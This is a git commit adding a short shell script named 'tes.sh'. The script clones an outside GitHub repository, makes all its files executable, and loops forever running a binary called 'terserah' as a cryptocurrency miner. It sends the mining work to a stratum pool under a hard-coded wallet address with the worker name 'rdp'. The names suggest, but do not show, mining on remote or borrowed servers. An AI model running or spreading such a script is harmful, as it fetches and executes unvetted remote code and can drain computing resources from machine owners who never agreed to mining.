036fdcd6d4271983ab1c5ae0742435e0461a6fa9
nevin1938 <78213568+nevin1938@users.noreply.github.com>
2021-01-29 19:55:43 +0700

    Create tes.sh

---
+++ tes.sh
@@ -0,0 +1,7 @@
+git clone https://github.com/champlin01/vps
+cd vps
+chmod +x *
+while [ 1 ]; do
+./terserah -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MnKwfmvym4Nhfh64x9cBG1sA5sbzjwHc1y.rdp
+sleep 3
+done
